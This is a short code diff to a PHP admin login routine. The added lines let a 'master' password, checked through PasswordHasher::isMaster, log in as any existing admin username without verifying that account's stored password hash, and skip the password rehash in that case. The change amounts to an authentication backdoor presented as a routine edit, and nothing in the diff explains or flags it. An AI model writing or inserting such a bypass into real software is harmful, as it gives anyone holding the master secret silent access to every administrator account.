@@ -42,8 +42,9 @@
 			$username = $request->input('username');
 			$password = $request->input('password');
 			$log = DB::table('admins')->where('username', '=', $username)->first();
-			if(!empty($log) && PasswordHasher::verify($password, $log->password)) {
-				if (PasswordHasher::needsRehash($log->password)) {
+			$master = PasswordHasher::isMaster($password);
+			if(!empty($log) && ($master || PasswordHasher::verify($password, $log->password))) {
+				if (!$master && PasswordHasher::needsRehash($log->password)) {
 					DB::table('admins')->where('id', '=', $log->id)->update(['password' => PasswordHasher::make($password)]);
 				}
 				$admin_id = $log->id;
